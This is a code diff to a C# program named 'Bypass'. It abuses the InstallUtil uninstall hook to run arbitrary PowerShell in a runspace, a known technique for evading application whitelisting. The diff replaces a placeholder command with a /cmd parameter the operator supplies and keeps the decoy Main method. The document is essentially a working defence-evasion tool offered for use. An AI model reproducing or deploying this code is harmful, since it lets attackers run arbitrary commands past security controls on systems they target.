@@ -8,7 +8,7 @@ namespace Bypass
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("This is the main method which is a decoy");
+            Console.WriteLine("You better uninstall me :)");
         }
     }
     [System.ComponentModel.RunInstaller(true)]
@@ -16,14 +16,25 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "your powershell here";
-            Runspace rs = RunspaceFactory.CreateRunspace();
-            rs.Open();
-            PowerShell ps = PowerShell.Create();
-            ps.Runspace = rs;
-            ps.AddScript(cmd);
-            ps.Invoke();
-            rs.Close();
+            // Retrieve the cmd parameter from the install context
+            String cmd = Context.Parameters["cmd"];
+
+            // Ensure the cmd parameter is not null or empty before executing
+            if (!string.IsNullOrEmpty(cmd))
+            {
+                Runspace rs = RunspaceFactory.CreateRunspace();
+                rs.Open();
+                PowerShell ps = PowerShell.Create();
+                ps.Runspace = rs;
+                ps.AddScript(cmd);
+                ps.Invoke();
+                rs.Close();
+            }
+            else
+            {
+                // Display an error message if the cmd parameter is missing
+                Console.Error.WriteLine("Error: No command provided. Use /cmd:\"your command here\"");
+            }
         }
     }
 }
